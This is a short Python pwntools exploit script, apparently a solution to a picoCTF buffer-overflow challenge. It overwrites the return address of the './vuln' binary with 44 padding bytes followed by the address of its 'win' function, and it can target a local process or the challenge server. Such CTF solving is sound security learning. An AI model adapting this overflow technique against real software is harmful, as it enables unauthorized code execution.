from pwn import *

bin='./vuln'

context.binary=bin
e=ELF(bin)
#Offline version
p=process(bin)
#Online version
#p=connect('saturn.picoctf.net',51223)
win_addr=e.symbols[b'win']
print(f"win address= {win_addr}")

r = ROP(e)
ret = r.find_gadget(["ret"]).address


payload=b'A'*44+pack(win_addr)

p.recvuntil(b'Please enter your string: ')
p.sendline(payload)
#gdb.attach(p)

#interactive alternative
output = p.recvall()
print(output.decode(errors="ignore"))

#p.interactive()

